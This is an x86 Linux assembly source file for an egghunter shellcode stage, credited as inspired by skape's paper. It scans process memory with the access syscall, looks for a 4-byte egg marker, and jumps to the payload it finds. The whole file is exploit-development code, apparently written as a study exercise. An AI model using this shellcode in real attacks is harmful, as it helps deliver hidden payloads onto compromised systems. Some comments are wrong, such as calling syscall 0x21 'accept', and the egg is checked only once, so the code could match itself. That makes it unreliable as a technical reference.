; Purpose: egghunter
; inspired from: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

global _start

section .text
  EGG equ 0x50905090     ; EGG = push eax; nop; push eax; nop

_start:
  xor ecx, ecx           ; clear
  mul ecx                ; registers

page_alignment:
  or bx, 0xfff           ; add 4095 to bx

inspection:
  inc ebx                ; make ebx = 4096 - page size
  mov al, 0x21           ; syscall for accept
  int 0x80               ; execute syscall
  cmp al, 0xf2           ; check if the current page(ebx) is accessible
  jz page_alignment      ; jump to page_alignment if page is inaccessible
  mov edi, ebx           ; mov address in ebx to edi
  mov eax, EGG           ; value of the egg stored in eax
  scasd                  ; check if the current page contains the EGG
                         ; this will scan the address in edi and compare
                         ; with the value of eax;
                         ; this is the same operation used in the third
                         ; implementation of egghunter by skape
  jnz inspection         ; jump to inspection if EGG is not found
  jmp edi                ; if EGG is found, jump to the address
